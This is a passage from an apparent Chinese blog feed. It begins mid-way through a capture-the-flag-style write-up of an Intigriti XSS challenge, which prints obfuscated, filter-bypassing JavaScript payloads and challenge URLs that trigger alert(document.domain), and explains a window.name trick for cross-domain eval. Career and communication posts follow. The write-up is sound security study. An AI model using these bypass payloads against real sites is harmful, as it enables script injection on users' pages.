]+`${e}`[18]+`${``+{}}`[6]+`${e}`[13]+`${``[0]}`[0]+`${``+{}}`[5]+`${``+{}}`[6]+`${``+{}}`[1]+`${e}`[13]]}`[15]+`${[][`${``+{}}`[5]+`${``+{}}`[1]+`${``[0]}`[1]+`${e}`[18]+`${``+{}}`[6]+`${e}`[13]+`${``[0]}`[0]+`${``+{}}`[5]+`${``+{}}`[6]+`${``+{}}`[1]+`${e}`[13]]}`[15]}```</p><h3 id="挑戰最短程式碼"><a href="#挑戰最短程式碼" class="headerlink" title="挑戰最短程式碼"></a>挑戰最短程式碼</h3><p>可以執行任意程式碼之後，還有什麼可以玩呢？那就是挑戰最短的程式碼！試著把程式碼弄到最短看看。</p><p>可以想到的有：</p><p>1.不要用 <code> ``[0]</code>拿到 undefined，而是用 <code>e[0]</code>，可以省一個字元<br>2. <code> ``+&#123;&#125;</code> 來拿 <code>[object Object]</code> 其實多此一舉，用 <code>&#123;&#125;</code> 就好，省了三個字<br>3. 有可以用到 e 的地方盡量用到 e，因為程式碼會最少</p><p>再來我們本來是用 <code>[][&#39;constructor&#39;]</code> 來拿到 function，這樣有點太長了，可以用很科學的方式來找出最短的：</p><p>找出來的冠軍是 <code>some</code>，可以拿來取代本來使用的 <code>[][&#39;constructor&#39;]</code> 。</p><p>最後呢，因為我們不需要執行任意程式碼了，所以用 <code>alert(document.domain)</code> 就好，至於 <code>eval(name)</code> 的話雖然乍看之下更短，但因為要拿到 v 不容易，所以其實會花費更多字元。</p><p>底下是產生出來的結果，長度 466 個字：</p><p>length: 466<br>=&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; Payload &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br>[][`${e}`[18]+`${e}`[1]+`${e}`[23]+`e`][`${e}`[5]+`${e}`[1]+`${e}`[25]+`${e}`[18]+`${e}`[6]+`${e}`[13]+`${e[0]}`[0]+`${e}`[5]+`${e}`[6]+`${e}`[1]+`${e}`[13]]`_${`${0&#x2F;0}`[1]+`${e}`[21]+`e`+`${e}`[13]+`${e}`[6]+`${[][`${e}`[18]+`${e}`[1]+`${e}`[23]+`e`]}`[13]+`${e[0]}`[2]+`${e}`[1]+`${e}`[5]+`${e[0]}`[0]+`${e}`[23]+`e`+`${e}`[25]+`${e}`[6]+`.`+`${e[0]}`[2]+`${e}`[1]+`${e}`[23]+`${0&#x2F;0}`[1]+`${e[0]}`[5]+`${e}`[25]+`${[][`${e}`[18]+`${e}`[1]+`${e}`[23]+`e`]}`[14]}`` `<br>=&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; URL &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br><a href="https://challenge-0521.intigriti.io/captcha.php?c=%5C%5B%5C%5D%5C%5B%5C%60$%7Be%7D%5C%60%5C%5B18%5C%5D+%5C%60$%7Be%7D%5C%60%5C%5B1%5C%5D+%5C%60$%7Be%7D%5C%60%5C%5B23%5C%5D+%5C%60e%5C%60%5C%5D%5C%5B%5C%60$%7Be%7D%5C%60%5C%5B5%5C%5D+%5C%60$%7Be%7D%5C%60%5C%5B1%5C%5D+%5C%60$%7Be%7D%5C%60%5C%5B25%5C%5D+%5C%60$%7Be%7D%5C%60%5C%5B18%5C%5D+%5C%60$%7Be%7D%5C%60%5C%5B6%5C%5D+%5C%60$%7Be%7D%5C%60%5C%5B13%5C%5D+%5C%60$%7Be%5C%5B0%5C%5D%7D%5C%60%5C%5B0%5C%5D+%5C%60$%7Be%7D%5C%60%5C%5B5%5C%5D+%5C%60$%7Be%7D%5C%60%5C%5B6%5C%5D+%5C%60$%7Be%7D%5C%60%5C%5B1%5C%5D+%5C%60$%7Be%7D%5C%60%5C%5B13%5C%5D%5C%5D%5C%60%5C_$%7B%5C%60$%7B0/0%7D%5C%60%5C%5B1%5C%5D+%5C%60$%7Be%7D%5C%60%5C%5B21%5C%5D+%5C%60e%5C%60+%5C%60$%7Be%7D%5C%60%5C%5B13%5C%5D+%5C%60$%7Be%7D%5C%60%5C%5B6%5C%5D+%5C%60$%7B%5C%5B%5C%5D%5C%5B%5C%60$%7Be%7D%5C%60%5C%5B18%5C%5D+%5C%60$%7Be%7D%5C%60%5C%5B1%5C%5D+%5C%60$%7Be%7D%5C%60%5C%5B23%5C%5D+%5C%60e%5C%60%5C%5D%7D%5C%60%5C%5B13%5C%5D+%5C%60$%7Be%5C%5B0%5C%5D%7D%5C%60%5C%5B2%5C%5D+%5C%60$%7Be%7D%5C%60%5C%5B1%5C%5D+%5C%60$%7Be%7D%5C%60%5C%5B5%5C%5D+%5C%60$%7Be%5C%5B0%5C%5D%7D%5C%60%5C%5B0%5C%5D+%5C%60$%7Be%7D%5C%60%5C%5B23%5C%5D+%5C%60e%5C%60+%5C%60$%7Be%7D%5C%60%5C%5B25%5C%5D+%5C%60$%7Be%7D%5C%60%5C%5B6%5C%5D+%5C%60.%5C%60+%5C%60$%7Be%5C%5B0%5C%5D%7D%5C%60%5C%5B2%5C%5D+%5C%60$%7Be%7D%5C%60%5C%5B1%5C%5D+%5C%60$%7Be%7D%5C%60%5C%5B23%5C%5D+%5C%60$%7B0/0%7D%5C%60%5C%5B1%5C%5D+%5C%60$%7Be%5C%5B0%5C%5D%7D%5C%60%5C%5B5%5C%5D+%5C%60$%7Be%7D%5C%60%5C%5B25%5C%5D+%5C%60$%7B%5C%5B%5C%5D%5C%5B%5C%60$%7Be%7D%5C%60%5C%5B18%5C%5D+%5C%60$%7Be%7D%5C%60%5C%5B1%5C%5D+%5C%60$%7Be%7D%5C%60%5C%5B23%5C%5D+%5C%60e%5C%60%5C%5D%7D%5C%60%5C%5B14%5C%5D%7D%5C%60%5C%60%5C%60">https://challenge-0521.intigriti.io/captcha.php?c=\[\]\[\`${e}\`\[18\]%2b\`${e}\`\[1\]%2b\`${e}\`\[23\]%2b\`e\`\]\[\`${e}\`\[5\]%2b\`${e}\`\[1\]%2b\`${e}\`\[25\]%2b\`${e}\`\[18\]%2b\`${e}\`\[6\]%2b\`${e}\`\[13\]%2b\`${e\[0\]}\`\[0\]%2b\`${e}\`\[5\]%2b\`${e}\`\[6\]%2b\`${e}\`\[1\]%2b\`${e}\`\[13\]\]\`\_${\`${0/0}\`\[1\]%2b\`${e}\`\[21\]%2b\`e\`%2b\`${e}\`\[13\]%2b\`${e}\`\[6\]%2b\`${\[\]\[\`${e}\`\[18\]%2b\`${e}\`\[1\]%2b\`${e}\`\[23\]%2b\`e\`\]}\`\[13\]%2b\`${e\[0\]}\`\[2\]%2b\`${e}\`\[1\]%2b\`${e}\`\[5\]%2b\`${e\[0\]}\`\[0\]%2b\`${e}\`\[23\]%2b\`e\`%2b\`${e}\`\[25\]%2b\`${e}\`\[6\]%2b\`.\`%2b\`${e\[0\]}\`\[2\]%2b\`${e}\`\[1\]%2b\`${e}\`\[23\]%2b\`${0/0}\`\[1\]%2b\`${e\[0\]}\`\[5\]%2b\`${e}\`\[25\]%2b\`${\[\]\[\`${e}\`\[18\]%2b\`${e}\`\[1\]%2b\`${e}\`\[23\]%2b\`e\`\]}\`\[14\]}\`\`\`</a></p><h3 id="再次縮短"><a href="#再次縮短" class="headerlink" title="再次縮短"></a>再次縮短</h3><p>把上面的結果拿去平台上 submit 之後，作者說目前看到最短的是 376 個字元。我想了一陣子發現想不太到，然後就靈機一動想說：「那來試試看 v 那個方法好了，先不管瀏覽器問題」</p><p>幫大家回顧一下瀏覽器問題是什麼，那問題就是如果想用 function to string 的方式拿到 v，Chrome 跟 Firefox 產生的結果不同：</p><p>[][‘some’]+’’  </p><p>&#x2F;&#x2F; Chrome<br>“function some() { [native code] }”<br>v: index 23  </p><p>&#x2F;&#x2F; Firefox<br>“function some() {<br>    [native code]<br>}”<br>v: index 27</p><p>所以同一個 payload 無法同時應用在這兩個網頁上面。</p><p>先不管這問題的話，產生出來的結果是這樣：</p><p>length: 376<br>=&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; Payload &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br>[][`${e}`[18]+`${e}`[1]+`${e}`[23]+`e`][`${e}`[5]+`${e}`[1]+`${e}`[25]+`${e}`[18]+`${e}`[6]+`${e}`[13]+`${e[0]}`[0]+`${e}`[5]+`${e}`[6]+`${e}`[1]+`${e}`[13]]`_${`e`+`${[][`${e}`[18]+`${e}`[1]+`${e}`[23]+`e`]}`[23]+`${0&#x2F;0}`[1]+`${e}`[21]+`${[][`${e}`[18]+`${e}`[1]+`${e}`[23]+`e`]}`[13]+`${e}`[25]+`${0&#x2F;0}`[1]+`${e}`[23]+`e`+`${[][`${e}`[18]+`${e}`[1]+`${e}`[23]+`e`]}`[14]}`` `<br>=&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; URL &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br><a href="https://challenge-0521.intigriti.io/captcha.php?c=%5C%5B%5C%5D%5C%5B%5C%60$%7Be%7D%5C%60%5C%5B18%5C%5D+%5C%60$%7Be%7D%5C%60%5C%5B1%5C%5D+%5C%60$%7Be%7D%5C%60%5C%5B23%5C%5D+%5C%60e%5C%60%5C%5D%5C%5B%5C%60$%7Be%7D%5C%60%5C%5B5%5C%5D+%5C%60$%7Be%7D%5C%60%5C%5B1%5C%5D+%5C%60$%7Be%7D%5C%60%5C%5B25%5C%5D+%5C%60$%7Be%7D%5C%60%5C%5B18%5C%5D+%5C%60$%7Be%7D%5C%60%5C%5B6%5C%5D+%5C%60$%7Be%7D%5C%60%5C%5B13%5C%5D+%5C%60$%7Be%5C%5B0%5C%5D%7D%5C%60%5C%5B0%5C%5D+%5C%60$%7Be%7D%5C%60%5C%5B5%5C%5D+%5C%60$%7Be%7D%5C%60%5C%5B6%5C%5D+%5C%60$%7Be%7D%5C%60%5C%5B1%5C%5D+%5C%60$%7Be%7D%5C%60%5C%5B13%5C%5D%5C%5D%5C%60%5C_$%7B%5C%60e%5C%60+%5C%60$%7B%5C%5B%5C%5D%5C%5B%5C%60$%7Be%7D%5C%60%5C%5B18%5C%5D+%5C%60$%7Be%7D%5C%60%5C%5B1%5C%5D+%5C%60$%7Be%7D%5C%60%5C%5B23%5C%5D+%5C%60e%5C%60%5C%5D%7D%5C%60%5C%5B23%5C%5D+%5C%60$%7B0/0%7D%5C%60%5C%5B1%5C%5D+%5C%60$%7Be%7D%5C%60%5C%5B21%5C%5D+%5C%60$%7B%5C%5B%5C%5D%5C%5B%5C%60$%7Be%7D%5C%60%5C%5B18%5C%5D+%5C%60$%7Be%7D%5C%60%5C%5B1%5C%5D+%5C%60$%7Be%7D%5C%60%5C%5B23%5C%5D+%5C%60e%5C%60%5C%5D%7D%5C%60%5C%5B13%5C%5D+%5C%60$%7Be%7D%5C%60%5C%5B25%5C%5D+%5C%60$%7B0/0%7D%5C%60%5C%5B1%5C%5D+%5C%60$%7Be%7D%5C%60%5C%5B23%5C%5D+%5C%60e%5C%60+%5C%60$%7B%5C%5B%5C%5D%5C%5B%5C%60$%7Be%7D%5C%60%5C%5B18%5C%5D+%5C%60$%7Be%7D%5C%60%5C%5B1%5C%5D+%5C%60$%7Be%7D%5C%60%5C%5B23%5C%5D+%5C%60e%5C%60%5C%5D%7D%5C%60%5C%5B14%5C%5D%7D%5C%60%5C%60%5C%60">https://challenge-0521.intigriti.io/captcha.php?c=\[\]\[\`${e}\`\[18\]%2b\`${e}\`\[1\]%2b\`${e}\`\[23\]%2b\`e\`\]\[\`${e}\`\[5\]%2b\`${e}\`\[1\]%2b\`${e}\`\[25\]%2b\`${e}\`\[18\]%2b\`${e}\`\[6\]%2b\`${e}\`\[13\]%2b\`${e\[0\]}\`\[0\]%2b\`${e}\`\[5\]%2b\`${e}\`\[6\]%2b\`${e}\`\[1\]%2b\`${e}\`\[13\]\]\`\_${\`e\`%2b\`${\[\]\[\`${e}\`\[18\]%2b\`${e}\`\[1\]%2b\`${e}\`\[23\]%2b\`e\`\]}\`\[23\]%2b\`${0/0}\`\[1\]%2b\`${e}\`\[21\]%2b\`${\[\]\[\`${e}\`\[18\]%2b\`${e}\`\[1\]%2b\`${e}\`\[23\]%2b\`e\`\]}\`\[13\]%2b\`${e}\`\[25\]%2b\`${0/0}\`\[1\]%2b\`${e}\`\[23\]%2b\`e\`%2b\`${\[\]\[\`${e}\`\[18\]%2b\`${e}\`\[1\]%2b\`${e}\`\[23\]%2b\`e\`\]}\`\[14\]}\`\`\`</a></p><p>376 個字，跟剛剛的 466 比起來少了快一百個。</p><p>用來產生的完整程式碼：</p><p>有些人可能不知道為什麼 <code>eval(name)</code> 可以，這是因為 <code>window.name</code> 是個神奇的屬性，基本上同一個分頁的 name 會相同，所以我們只要自己新建一個 html，裡面寫 JS 並且設定 <code>window.name = &#39;alert(document.domain)&#39;</code>，然後用 <code>location=</code> 跳轉到 PHP 那邊，那裡的 <code>name</code> 就會是我們剛剛設定好的。</p><p>沒錯，跨網域也適用。</p><p>因為我最後試出來的結果也是 376 個字，跟作者說的最短 payload 相同，詢問過後發現其實就是同一個。</p><h3 id="結語"><a href="#結語" class="headerlink" title="結語"></a>結語</h3><p>從這個挑戰中可以學到一些 JS 相關的東西，像是：</p><ol><li>在限制之下湊出指定字元</li><li>用反引號 backtick 來呼叫函式以及參數的規則</li><li>用 function constructor 動態建立函式</li></ol><p>這些知識在什麼時候會有用呢？對攻擊者而言，當你碰到一個有過濾字元的地方的時候，就可以利用這些技巧想辦法繞過限制。</p><p>對防禦方來說，在過濾時就需要考量到這些繞過的方法，如果知道可以這樣繞過，就能把 filter 訂得更精確。</p><p>不過這都只是後話，對我來說會解這些題目只是因為好玩，也沒有去想說會有什麼幫助，那些都是以後的事了。</p><p>這個平台每個月都會有 XSS 挑戰，期待之後的更多挑戰！</p>]]></content>
      
      
      <categories>
          
          <category> Others </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Others </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>暫別前端，重新開始</title>
      <link href="/2021/06/05/byebye-front-end-hi-security-fda6be0cb7ce/"/>
      <url>/2021/06/05/byebye-front-end-hi-security-fda6be0cb7ce/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/byebye-front-end-hi-security-fda6be0cb7ce/0__qHHqO1gwybwHZq2V.jpg"></p><p>現在是 2021-03-03，剛做完決定的一週後。雖然說要到五月才會正式轉職，但想說在這個時刻先把當下的心情寫下來，否則再等兩個月心得感想就都從海馬迴消失了。</p><blockquote><p>從五月開始，我暫時不寫前端了，我要內轉去公司做資安的部門當資安研究員。</p></blockquote><p>我是做完這個決定之後，才突然意識到這其實是職涯上的一個滿大的轉變。在前端的經歷其實對於這個新的領域來說幾乎完全不適用，我可能就是一張白紙，一張，還很菜的白紙。</p><p>如果我哪天想回去做前端怎麼辦？會不會到時候怎麼寫都忘記了，自斷前端職涯，到時候回去又要從頭再來？如果我資安做出興趣來了，可是沒辦法留在原公司要到新公司，那是不是整個經歷重算？資安菜雞的重啟人生。</p><p>但這些其實都是我做完決定之後才想到的事，是我跟新部門主管表達意願，談好之後的工作內容，再跟原主管以及大主管確認完可行性跟時間，等一切都塵埃落定之後，我才想到的事。</p><p>對於職涯，我本來就沒有想這麼多，我抱持的信念是有能力的人自然能找到出路，如果找不到，是我能力不足。</p><p>會想轉去資安部門的原因有幾個，其中一個原因是，這本來就是我很想補齊的一塊拼圖，而另外一塊是演算法。</p><p>為什麼會是這兩塊？因為這兩塊是我曾經有機會學好，有機會做好，但我卻沒有做到的事情。我接觸這兩個領域的時間其實都很早，但自己沒有把握住，所以成了心中的一個小小遺憾，更詳細的故事可以參考：<a href="/2017/10/05/the-programming-journey-1-b9b19c0ef05b/">自學、哲學、講學：我的程式之路</a>。</p><p>再來就是對這個領域是真的有興趣，一直都滿有興趣的，不過我的時間大多數都拿來上班跟下班後的教學了，所以有興趣歸有興趣，不一定會付諸行動。真的比較接觸這領域是來這間公司之後，有同事跟我分享他正在修的資安相關課程，我就跟著他加減看一下，看一看解了課程的題目，發現真的很有趣。</p><p>後來參加了一兩場線上的 CTF（Capture The Flag，一種駭客解題的比賽），因為對網頁最熟所以只打 web 題，覺得有些題目出得真的很巧妙。我已經很久沒有因為什麼事情而熬夜了，但某一個我覺得我應該可以解出來的題目，讓我熬夜到快凌晨四點，拿到 flag 解出來之後才安心入睡。</p><p>而就是發現了（與其說發現，其實不如說是想起）這種對題目的執著、興趣以及熱情，讓我決定轉到資安團隊去。</p><p>這是 2021–06–05，寫了上面那段以後已經過了三個月，也在前陣子正式加入了公司的資安團隊。上面原本應該要寫更多的，但那天晚上寫那一段之後好像就有點晚了，就跑去洗澡睡覺了，於是後面都沒有寫到。</p><p>總之呢，就是在打 CTF 的時候讓我想起了解題的快樂跟對攻擊的熱情，再加上剛好有這個機會，沒有想太多就直接轉過去了。我並沒有先想好我的職涯發展要怎麼走，是要把自己定義成比較懂資安的前端工程師呢，還是專門研究前端相關的資安研究員，這些我都不知道，但就先試一陣子吧，看看狀況怎麼樣再來決定。</p><p>我知道真正轉去做資安其實跟 CTF 滿不一樣的，例如說 CTF 可能頂多就是兩三天，然後問題一定會有解答，通常方向也比較單一，說是 web 就一定是 web。可是在真實世界找漏洞的時候並不是這樣，是不一定有解答的，有可能走的那一條路是死路，也有可能會有需要的知識超出 web 的時候。</p><p>再者，資安也不是只有找漏洞，例如說有人往合規走，有人往偏向防禦的藍隊走，也有人轉成資安顧問。其實還有很多分得比較細的職缺，都屬於資訊安全的領域。而我喜歡的，可能只是這麼多裡面其中的一種。</p><p>目前為止轉 team 大概過了快一個月，剛開始在支援 team 裡面的一個暫時的系統的開發，能用熟悉的前端來幫助團隊達成目標，感覺還是挺不錯的。後來就是研究一些自己有興趣的題目，還有去試著找一些網站來打（有 bug bounty 的那種）。</p><p>這段期間時不時都會有種眼界大開的感覺，而且我覺得厲害的是，這並不是因為「知道了一個不知道的東西」而感到驚訝，而是「知道了以為自己知道的東西」。寫了幾年前端，看過的東西其實不少，比較沒有什麼會讓我「哇！」出來的東西，或者換個角度講，應該是我對那些東西也沒有太大的興趣。</p><p>比如說一些新的架構、新的框架或是語法，看到之後頂多就是「嗯嗯」，不會有太多的情緒起伏，而熟悉的 JavaScript 除了偶爾會碰到一些 edge case 讓我感興趣以外，其他狀況我都自認跟它很熟了。</p><p>但在資訊安全的領域就完全是另外一回事了，我從我自以為熟悉的前端領域中，得到了很多新的知識。這感覺就像是別人如果跟我說飛機的知識，我會覺得哇好酷，以前都不知道，但如果別人跟我說 JavaScript 其實可以這樣運用來達成攻擊，我就會覺得「哇操勒，居然可以這樣嗎！！太屌了吧！！我寫這麼久怎麼完全沒想過！」</p><p>像我前陣子看到的這一篇：<a href="https://whitton.io/articles/xss-on-facebook-via-png-content-types">An XSS on Facebook via PNGs &amp; Wonky Content Types</a></p><p>這篇真的很讚，先發現了一個可以把 PNG 當 HTML 來 render 的 bug，然後在 PNG 裡面塞入資訊，讓它用文字顯示時可以順利轉成 script tag，就得到了一個 CDN domain 的 XSS。</p><p>但在 CDN 可以 XSS 沒什麼用，於是就找了有哪些 subdomain 有指到 CDN 去，成功找到一個，再來利用 document.domain 以及 Page Plugin 讓兩個網址變得同源，就可以偷到 CSRF token，然後對主站做操作。</p><p>就是這些小漏洞一步步串起來然後變成最後這個樣子。</p><p>還有這篇：<a href="https://devco.re/blog/2019/09/02/attacking-ssl-vpn-part-3-the-golden-Pulse-Secure-ssl-vpn-rce-chain-with-Twitter-as-case-study/">Attacking SSL VPN - Part 3: The Golden Pulse Secure SSL VPN RCE Chain, with Twitter as Case Study</a></p><p>原本以為繞不過的限制，換個角度去思考，把錯誤訊息當作程式碼來執行，就能順利繞過，真的很強！</p><p>上面這些 writeup 都是我看到的時候會不自覺地驚嘆的那種，因為這些都突破了我對現有知識以及領域的想像。</p><p>在前端的世界中，<a href="https://xsleaks.com/">XS-Leaks wiki</a> 也是突破了我的眼界，讓我吸收了很多新的知識，而且也開始對這類型的攻擊方式產生興趣。</p><p>講到 writeup，這也是我很喜歡這個領域的一點，那就是通常漏洞的發現者都會把發現的過程寫成 writeup，而寫得好的文章，真的會讓讀者很享受在那個過程，感覺好像就是自己在解問題一樣。對於一個本來就愛寫的人來說，這確實也是很吸引我的一點。</p><p>今年對我來說是個「放下」的一年，要放下一些陪伴了自己好一段時光的事物，前端是第一個。</p><p>雖然說暫時離開了前端相關的工作，但其實平時常關注的漏洞還是跟 web 有關，我也希望能把這些前端資訊安全相關的概念，再帶回去給前端工程師們，讓他們也體驗一下我當初的那種驚奇之感。</p><p>前端掰，資安嗨！</p>]]></content>
      
      
      <categories>
          
          <category> 職涯 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 職涯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>非同步溝通</title>
      <link href="/2021/04/03/async-communication-f786eb49a1da/"/>
      <url>/2021/04/03/async-communication-f786eb49a1da/</url>
      
        <content type="html"><![CDATA[<blockquote><p><em>這其實不是一篇技術文，但就是因為不是技術文所以開頭才要來解釋一下什麼是同步。懶得看的話可以直接下拉看第二段。</em></p></blockquote><p>在程式的領域中有一個名詞叫做「同步」，講到這個你可能會想到「同步進行」，例如說「這個調查我們同步進行」，你做你的我做我的，兩邊同時進行。但同步進行的「同步」翻成英文比較像是 parallel 的概念，也就是平行。</p><p>而程式領域中的同步是另外一個意思，比較像是你打開筆記軟體或是信箱時候出現的「同步處理中…」的同步，例如說我在電腦版打開 LINE，可能會出現「訊息同步中」，表示程式正在把手機上的訊息同步到我的電腦，這裡的「同步」就不是平行的意思了，而是「讓兩邊一致」，翻成英文是 synchronous。</p><p>程式領域中的同步指的就是 synchronous 而不是 parallel。那既然同步是要讓兩邊一致，就必定會有一個等待的過程，比較快的要等比較慢的追上來，兩者才會同步。</p><p>因此在程式領域中，同步指的就是「做一件事情時要等它結束，才做下一件事」。以讀檔案為例好了，程式碼可能會長成下面這樣：</p><pre><code class="js">let content = read\_file(&#39;note.txt&#39;) // 讀取檔案print content // 印出</code></pre><p>第一行指示電腦去讀取一個檔案，等到讀取完畢之後會把內容指定給叫做 content 的變數，第二行則是把它，也就是把檔案內容印出。</p><p>如果程式是同步執行的，那在第一行執行完畢時就代表檔案已經讀取完了，才會繼續執行第二行。若是檔案很大要讀取十秒鐘，那第一行就會卡在那邊十秒，十秒後才繼續執行下一行。</p><p>同步的相反就叫做非同步（asynchronous，同步前面加個 a），代表程式碼在執行某些操作的時候是不等的。</p><p>以同樣的程式碼為例：</p><pre><code class="js">let content = read\_file(&#39;note.txt&#39;) // 讀取檔案print content // 印出</code></pre><p>在執行第一行時，程式只負責「叫系統去讀檔案」，然後等檔案讀取完的時候再跟他說。因此就算讀檔要十秒，也不需要在這邊等待十秒，而是可以立即執行第二行，但在執行第二行時的 content 就不會是檔案內容了，因為這時候檔案根本沒讀取完。</p><p>那非同步怎麼回傳結果呢？就沒辦法用上面這樣的形式了，而是要換一種方式，換成那個閃閃發亮的紅色圓盤。</p><p>在百貨公司地下街點餐時如果你點完要一直在那邊等，沒辦法去其他地方，這就叫做同步。如果點餐之後店員給了你一個呼叫器，你可以先去別的地方，等到餐點好了的時候會透過呼叫器通知你，這就叫做非同步。</p><p>因此非同步的程式碼會像這樣：</p><pre><code class="js">function done(content) &#123; print content // 印出&#125;read_file(&#39;note.txt&#39;, done) // 讀取檔案，讀取完時呼叫 done()</code></pre><p>讀檔的函式現在沒有回傳值了，而是需要傳入一個 function，等到讀檔完成時再去呼叫你提供的函式。</p><p>化為點餐的範例就是這樣：</p><pre><code class="js">function 呼叫器() &#123;  // 呼叫器響了，來拿餐囉&#125;點餐(&quot;排骨飯&quot;, 呼叫器); // 點餐，做好的時候呼叫呼叫器</code></pre><p>所以在非同步的模式之下那些耗時的操作不會阻礙你做下一件事，你不會被卡在那邊。在瀏覽器上面跑的程式就必須要是非同步的，因為你想想，如果是同步的話，那你去 server 拿個資料花十秒，你畫面就停住十秒不動了，因此這操作必須是非同步的。</p><p>但這篇其實沒有想談程式，而是要來談溝通。</p><h3 id="先來談談寫信"><a href="#先來談談寫信" class="headerlink" title="先來談談寫信"></a>先來談談寫信</h3><p>像是寫信就是一件很非同步的事情，我寫完信之後寄給你，我不用每天都守在家裡等郵差送信來，而是可以去做其他事，等郵差主動上門就好。所以訊息之間是有時間差的，差距多寡取決於距離跟回信的快慢。</p><p>寫 Email 也是，你通常寫出去之後不會預期立刻有個回應，而是會等個一兩天或甚至更久，也因為如此，在寫信時會盡可能思考多一點狀況，可能就可以少一次來回，減少溝通成本。</p><p>舉例來說，如果寫 Email 沒有思考的話，約時間就會是這樣：</p><blockquote><p><em>&gt; 我後天八點有空，你呢？</em></p></blockquote><blockquote><p><em>我沒有欸，那你禮拜三九點有空嗎？</em></p></blockquote><blockquote><p><em>&gt; 沒有，那你星期四十點有空嗎？</em></p></blockquote><blockquote><p><em>有，那就這樣吧</em></p></blockquote><blockquote><p><em>&gt; 好！</em></p></blockquote><p>經過了五封信件，兩造達成共識約好時間。但有些人預期到信件是需要時間的，可能就會先這樣寫：</p><blockquote><p><em>&gt; 我這周有空的時間是：<br>&gt; 後天 八點以後<br>&gt; 週四 八點以後<br>&gt; 週五 八點以後<br>&gt; 再看看你要約什麼時候</em></p></blockquote><blockquote><p><em>就星期四十點吧</em></p></blockquote><blockquote><p><em>&gt; 好！</em></p></blockquote><p>只要三次的來回就搞定了，因為有把「如果對方後天八點沒空怎麼辦」這個狀況給考慮進去。</p><h3 id="懷念的即時通"><a href="#懷念的即時通" class="headerlink" title="懷念的即時通"></a>懷念的即時通</h3><p>早期的即時通訊其實是很同步的溝通模式，通常不太會留言給離線的人，而是看對方上線才會敲他。如果敲了沒有反應，還會送對方一個「叮咚！有人在家嗎～」或是一個嗆聲娃娃。</p><p>確認對方有在線上之後才開始聊天，有事情會說暫離，要下線會說我要下線了，像我有個學妹每次密他她都剛好有事說要先閃了，真的很忙。</p><p>會這樣是因為當年網路沒有現今這麼方便，可能每天（或間隔更久）都只有固定一段時間可以在電腦前上網，所以才需要這樣的溝通模式，利用兩個人都在線上的時候趕快把事情給搞定。</p><p>但現在的即時通訊不一樣了。</p><h3 id="現代的即時通訊"><a href="#現代的即時通訊" class="headerlink" title="現代的即時通訊"></a>現代的即時通訊</h3><p>現在網路已經是隨身必備的東西，因此大家在零碎時間時可能都會滑一下手機或是看個訊息。這已經不是那種「上線就會連續上線一段時間，下線就會下線好一陣子」的年代了。</p><p>在這種零碎的時間之下，同步溝通就顯得沒什麼意義。</p><blockquote><p><em>在嗎？</em></p></blockquote><p>請大家在發送這句話之前，先花個三秒想一下：「我想講的事情真的需要對方同時在線上嗎？」，如果需要的話，麻煩把句子寫完整：「在嗎？我有事情想要在你有空的時候直接跟你說」；如果不需要的話，麻煩擺脫同步的溝通模式，改採非同步，直接把你要講的事情說清楚。</p><p>你真正要講的事，其實就只是原本對方回「在」以後你要說的事，如果你不需要對方同時在線上，「在嗎」就是毫無意義而且會讓訊息多一次來回的句子。</p><p>你該做的是把想講的直接寫出來：</p><blockquote><p>嗨！最近想約你敘舊吃個晚餐，你下禮拜方便嗎？</p></blockquote><p>這樣等對方有空回訊息的時候就會來回你訊息，這也不是什麼對方一定要同時在線上才能講的事。</p><p>問我程式問題的時候也是一樣，不需要用「在嗎？」來當作開場白，甚至連開場白都不需要有，你就是把問題直接丟過來就對了，等我有空的時候自然就會回，而你問完之後就可以去做其他事情了，對於這些不需要同時在線上的事，非同步溝通才是比較有效率的解法。</p><p>如果對方回一回訊息突然不見，若是沒有在討論什麼真的很重要的事，你也不必多想，畢竟回訊息的時間本來就可能是零碎時間，例如說中午吃飯的空檔，或是搭公車的時候滑手機回一下，回完就把手機收起來了。在這樣一個使用網路時時間零碎的時代，這都是很正常的事情。</p><p>我自己幾乎沒在看已讀跟未讀，一來是因為很多人會看，所以有各種 App 或是方法可以看到訊息但不標已讀，二來是已讀不回也不代表什麼，像是我對於有些訊息就會想先點開，但要思考個一兩天看看怎麼回，已讀不回可能只是暫時的沒回，並不是真的就不回。</p><p>如果過了一兩週還真的沒回，那可能才是不想回或是漏掉了，可以等那個時候再做後續的處理。總之我想說的是，已讀後暫時沒有回覆是正常的，讀了訊息不代表對方馬上就要回你。</p><p>所以除非事態緊急，不然看對方已讀還是未讀其實是沒什麼意義的，大概只會有負面的影響而已吧，影響了你自己的心情。</p><h3 id="非同步溝通的好處"><a href="#非同步溝通的好處" class="headerlink" title="非同步溝通的好處"></a>非同步溝通的好處</h3><p>每個人都可以自由且彈性地利用時間。當我想討論某件事情時我不用跟對方喬一個時間，我就先把自己想到的全都寫下來寄給對方，再等對方回覆就好。我就可以去做其他事情了，對方也可以去做其他事。</p><p>但有時候同步其實還是必須的，因為非同步就是善用零碎時間，把時間切成一小塊一小塊的，把事情搞定所需要的「整體時間」可能較短，但是時程可能會拉長，如果想在短時間內直接搞定，那約個同步的 meeting 